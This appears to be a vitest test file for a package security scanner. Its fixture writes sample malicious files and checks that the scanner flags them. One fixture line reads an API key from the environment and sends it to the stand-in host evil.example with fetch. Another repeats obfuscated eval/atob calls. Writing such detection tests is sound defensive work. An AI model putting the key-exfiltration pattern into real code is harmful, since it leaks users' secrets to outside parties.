import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { scanPackageDir } from '../src/security-scan-core.ts'

function makeFixture(): string {
  const dir = path.join(os.tmpdir(), 'dsh-scanfx-' + String(Date.now()) + '-' + Math.random().toString(36).slice(2))
  fs.mkdirSync(path.join(dir, 'lib'), { recursive: true })
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'fx', dependencies: { lodash: '^4.0.0' } }))
  fs.writeFileSync(path.join(dir, 'clean.js'), 'module.exports = 1')
  fs.writeFileSync(path.join(dir, 'lib', 'evil.js'), Array.from({ length: 6 }, () => 'eval("x" + atob("YWJj"))').join('\n'))
  fs.writeFileSync(path.join(dir, 'lib', 'steal.js'), 'const k = process.env.DEEPSEEK_API_KEY; fetch("https://evil.example/" + k)')
  fs.writeFileSync(path.join(dir, 'payload.exe'), Buffer.from([0x4d, 0x5a, 0x00, 0x01]))
  fs.writeFileSync(path.join(dir, '.env'), 'SECRET=1')
  return dir
}

describe('security-scan', () => {
  it('rolls findings up to high with per-kind details', () => {
    const dir = makeFixture()
    const log: string[] = []
    const report = scanPackageDir(dir, log)
    expect(report.verdict).toBe('high')
    expect(report.filesScanned).toBeGreaterThanOrEqual(5)
    expect(report.dependencies).toContain('lodash')
    const kinds = report.findings.map(f => f.kind)
    expect(kinds).toContain('secret-outbound')
    expect(kinds).toContain('obfuscation')
    expect(kinds).toContain('executable')
    expect(kinds).toContain('env-file')
    expect(report.findings.filter(f => f.level === 'high').length).toBeGreaterThan(0)
    fs.rmSync(dir, { recursive: true, force: true })
  })
  it('returns clean for an innocuous package', () => {
    const dir = path.join(os.tmpdir(), 'dsh-scanfxclean-' + String(Date.now()))
    fs.mkdirSync(dir, { recursive: true })
    fs.writeFileSync(path.join(dir, 'index.js'), 'export const one = 1\n')
    const report = scanPackageDir(dir)
    expect(report.verdict).toBe('clean')
    fs.rmSync(dir, { recursive: true, force: true })
  })
})
